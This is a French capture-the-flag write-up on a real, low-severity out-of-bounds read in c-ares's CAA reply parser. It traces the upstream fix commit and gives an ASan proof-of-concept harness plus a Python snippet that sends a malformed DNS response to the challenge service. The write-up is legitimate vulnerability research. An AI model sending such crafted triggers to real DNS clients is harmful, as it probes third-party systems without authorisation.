# VULN#003 — service d'inspection de réponses DNS (c-ares, OOB read CAA)

**Auteur :** lyons

> Challenge bugpwn `<HOST>:<PORT>`, catégorie Vuln Research, 82 pts.

## c-ares — audit d'un snapshot git puis validation sur un service DNS (OOB read CAA)

**Catégorie :** pwn / vuln research
**Mots-clés :** c-ares, DNS, CAA, oob read, use-of-uninitialized-value, oss-fuzz, audit source, git diff, bounds check, parser, service muet, framing u32, rate-limit
**CVE / Advisory :** pas de CVE — finding OSS-Fuzz (issue 26012), corrigé par le commit upstream `4d6975b3`

### Contexte

Une archive **source seule** (aucun binaire fourni) est distribuée, possiblement doublée
d'un service distant qui « parse toute réponse DNS qu'on lui envoie ». L'objectif :
remettre la main sur la vulnérabilité, l'armer contre ce service, puis juger son
exploitabilité. Ici : c-ares `1.16.1` en plein développement (arbre git, et non le tarball
de release).

Règle d'or : lorsque la cible est un **snapshot git** d'un projet open source, la
comparaison qui compte n'est pas celle contre le tarball de release (layout différent,
bruit considérable) mais contre le **dépôt upstream**. On repère le commit exact, puis on
parcourt les commits **qui suivent immédiatement** : le correctif est fréquemment posé
juste derrière.

### Indicateurs

- `AC_INIT([c-ares], [1.16.1], ...)` mais sans `configure` généré ni `.git`.
- `README.md`, `SECURITY.md` et `test/` manquants ou tronqués → arbre issu d'un checkout git.
- Version « en dev » : `ares_version.h` peut encore citer la version précédente alors que
  le code embarque déjà des fonctions récentes.
- Une fonction de parsing fraîchement ajoutée (ici `ares_parse_caa_reply`, RFC 6844/8659).

### Méthode — retrouver le commit et son correctif

```bash
# 1. Extraire et repérer la version
tar xzf <ARCHIVE>.tar.gz -C /tmp/work/cares
grep -n 'AC_INIT' /tmp/work/cares/configure.ac

# 2. Cloner l'upstream COMPLET (pas un tarball de release)
git clone https://github.com/c-ares/c-ares.git /tmp/work/cares-git

# 3. Trouver le commit exact : comparer contenu à contenu
diff -rq --exclude=.git /tmp/work/cares /tmp/work/cares-git
# -> seul "Only in cares-git: test" : tout le reste est identique.
#    => HEAD upstream = commit exact du challenge (ex. 89e9eeb4).

# 4. Regarder les commits APRÈS ce point
cd /tmp/work/cares-git
git log --all --format='%h %ci %s' --since='<DATE_DU_COMMIT>'
git show <COMMIT_SUIVANT>
```

Ici, l'arbre se révèle **byte-identique** au commit `89e9eeb4` (« fuzz CAA parsing »), et
le commit qui suit, `4d6975b3`, s'intitule justement « Fix OSSFuzz reported issue in CAA reply
parsing ». C'est la marque d'un bug **authentique** (et non injecté) : le challenge est
calé juste avant le patch.

> Si `diff` montre des fichiers modifiés, c'est un bug **injecté** : lire ces diffs en
> priorité. Si tout est identique, c'est une vulnérabilité upstream réelle : chercher le
> premier correctif de sécurité après le commit.

### Le bug — dépassement de lecture dans le parseur CAA

`ares_parse_caa_reply()` lit `critical` et `plength` **avant** de s'assurer que le champ
RDLENGTH (`rr_len`) compte bien au moins ces 2 octets :

```c
rr_len = DNS_RR_LEN (aptr);
aptr += RRFIXEDSZ;
if (aptr + rr_len > abuf + alen) { status = ARES_EBADRESP; break; }  /* borne du RR */

strptr = aptr;
caa_curr->critical = (int)*strptr++;   /* lit aptr[0] */
caa_curr->plength  = (int)*strptr++;   /* lit aptr[1] */
if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2) {
  status = ARES_EBADRESP; break;       /* sort AVANT d'utiliser les octets lus */
}
```

Dès que `rr_len == 0` ou `1`, le check `aptr + rr_len > abuf + alen` laisse passer (le
pointeur reste au plus à la fin du buffer), puis les deux lectures franchissent la fin du
message de 1–2 octets. Avec `rr_len == 2`, `rr_len - 2 == 0` rend la condition
systématiquement vraie : on sort là aussi (mais sans dépassement).

Le correctif upstream (`4d6975b3`) — contrôler **avant** de lire :

```c
if (rr_len < 2) { status = ARES_EBADRESP; break; }
caa_curr->critical = (int)*strptr++;
caa_curr->plength  = (int)*strptr++;
```

### PoC — harness ASan réduit au strict nécessaire

Nul besoin du service pour prouver le bug : on invoque directement le parseur sur une
réponse DNS fabriquée, logée dans un buffer **heap dimensionné à la taille exacte** (sans
quoi ASan reste aveugle).

```c
/* Reponse DNS : header qd=1 an=1, question "a.", answer CAA (type 257),
   RDLENGTH = 0 ou 1, puis exactement rdlen octets de data. */
unsigned char *buf = malloc(n);          /* taille EXACTE, pas de slack */
memcpy(buf, p, n);
struct ares_caa_reply *out = NULL;
int r = ares_parse_caa_reply(buf, n, &out);   /* OOB read si rdlen < 2 */
```

Compilation (la lib étant construite avec ASan) :

```bash
# cmake récent supprime la compat < 3.5 : forcer la policy pour les vieux CMakeLists
cmake -G Ninja <SRC> -DCMAKE_POLICY_VERSION_MINIMUM=3.5 \
  -DCARES_STATIC=ON -DCARES_SHARED=OFF -DCARES_BUILD_TESTS=OFF -DCARES_BUILD_TOOLS=OFF \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
ninja
gcc -fsanitize=address -g -O1 -I<SRC>/include -I<SRC>/src/lib -I<BUILD> \
  caa_poc.c <BUILD>/lib/libcares.a -o caa_poc
```

Ce qu'on obtient (version vulnérable) :

```
ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
  #0 ares_parse_caa_reply ares_parse_caa_reply.c:139   (critical)
```

Avec `rdlen=1`, c'est la ligne 140 qui se déclenche (`plength`). Une fois le correctif
appliqué, les mêmes entrées renvoient `ARES_EBADRESP` (10) et **aucun** rapport ASan.
`rdlen=3` tient lieu de contrôle.

### Service distant — protocole et mode de déclenchement

Le service d'inspection DNS veut un **préfixe de longueur sur 4 octets big-endian**,
suivi à la lettre de la réponse DNS brute, puis un `shutdown(SHUT_WR)` :

```text
[u32 BE = len(message)] [message DNS]
```

Sans préfixe (ou avec un u16 / u32 little-endian), le service renvoie `status: bad length`.
Préfixe correct : il parse la réponse puis affiche un statut :

- `status: no effect` → réponse syntaxiquement bonne, parseur non déclenché ;
- `status: insufficient` → `rdlen == 1` (le parseur sort, mais le déclencheur manque de
  sa dernière pièce) ;
- `status: confirmed` + flag → **`rdlen == 0`** : le RR CAA final est dépourvu de
  données, les deux lectures hors bornes ont lieu, et le service déclare la
  vulnérabilité confirmée.

Message minimal suffisant pour déclencher (question `a.`, réponse CAA de type 257,
`rdlen=0`) :

```python
hdr   = struct.pack(">HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0)
q     = b"\x01a\x00" + struct.pack(">HH", 1, 1)
rr    = b"\xc0\x0c" + struct.pack(">HHIH", 257, 1, 0, 0)   # RDLENGTH = 0
msg   = hdr + q + rr
sock.sendall(struct.pack(">I", len(msg)) + msg)
sock.shutdown(socket.SHUT_WR)
```

Un rate-limit se met en travers après quelques requêtes (`status: rate limited, try again later`) :
réserver le payload `rdlen=0` à la tentative utile, ou espacer les envois.

### Exploitabilité — loin de constituer un primitif de pwn

- **Lecture seule**, de 1–2 octets, aussitôt suivie d'un `break` : les valeurs lues ne
  sont ni copiées dans la sortie ni retournées. `*caa_out` demeure `NULL` en cas
  d'échec. → **aucune fuite d'information**.
- **Aucune écriture / aucun débordement** : la copie de `property`/`value` est encadrée
  par `plength`/`length`, eux-mêmes confrontés à `rr_len`. Le check `aptr + rr_len > ...`
  bloque tout débordement en écriture.
- **Réel en TCP** : c-ares dimensionne `server->tcp_buffer = ares_malloc(tcp_length)` à la
  taille exacte du message ; un RR CAA final portant `rdlen=0/1` produit donc un
  authentique over-read heap.
- **Masqué en UDP** : la réception passe par `unsigned char buf[MAXENDSSZ + 1]` (pile),
  et l'octet « hors message » reste ainsi dans le buffer.
- **Crash improbable** : les quelques octets qui suivent une allocation malloc demeurent
  dans l'arène (mappée). Ni DoS fiable, ni RCE à l'horizon.
- Classification : finding **OSS-Fuzz** de type *use-of-uninitialized-value* (MSan) /
  heap-buffer-overflow (ASan). Sévérité modeste, mais bug mémoire bien réel.

En conclusion, le livrable tient au **PoC + à la caractérisation** du bug, pas à un
shell. Le service distant se contente d'attester le déclenchement (`status: confirmed`)
et de délivrer le flag : aucune fuite mémoire ni exécution de code à en attendre. C'est
un challenge d'audit de code dont la validation se résume à un « crash/OOB confirmé »
côté serveur.

### Pièges

- **Bannir le diff contre le tarball de release** : layout aplati, génération différente
  → des faux positifs partout. Comparer via un clone git, avec `--exclude=.git`.
- Un tree identique à l'upstream ≠ « pas de vuln » : la vuln est **réelle**, pas injectée.
- ASan ne repère l'OOB qu'avec un buffer **exactement** dimensionné (`malloc(n)` +
  `memcpy`) ; un buffer plus vaste (ex. 64 Ko) cache la lecture.
- `rr_len == 2` sort lui aussi : ne pas décréter « borne OK » sans avoir lu la condition
  `>= rr_len-2`.
- Le correctif peut se limiter à un **réordonnancement** de checks (valider avant de
  lire) : examiner toujours le diff exact, pas seulement le message de commit.
- Autres candidats à connaître dans les snapshots 1.16.1 si le commit ne précède aucun
  fix : CVE-2020-8277 (OOM `ares_parse_{a,aaaa}_reply`), `c15f4038` (nom de requête vide),
  `0d252eb3` (`*naddrttls` trop grand). Déterminer lequel est corrigé **immédiatement**
  après.

### Validation

- ASan désigne `ares_parse_caa_reply.c:139` (puis `:140`) pour `rdlen=0`/`1`.
- Version patchée : `ret=10`, `out=(nil)`, et plus aucun rapport ASan.
- Contrôle `rdlen=3` : pas d'OOB (le parseur reste libre de renvoyer `ARES_EBADRESP`).
- Service distant : `rdlen=0` (préfixe u32 BE) donne `status: confirmed` ; `rdlen=1` donne
  `status: insufficient` ; `rdlen=3` donne `status: no effect`.
- Le diff upstream ne modifie qu'un fichier et ~6 lignes → correctif chirurgical, en
  accord avec le bug.

### Références

- OSS-Fuzz issue 26012 — *use-of-uninitialized-value* signalé dans le parsing CAA.
- Commit d'introduction : `f5b4c085` (naissance du parseur CAA).
- Commit de fuzzing : `89e9eeb4` (état exact du snapshot).
- Commit de correctif : `4d6975b3` (validation `rr_len < 2`).
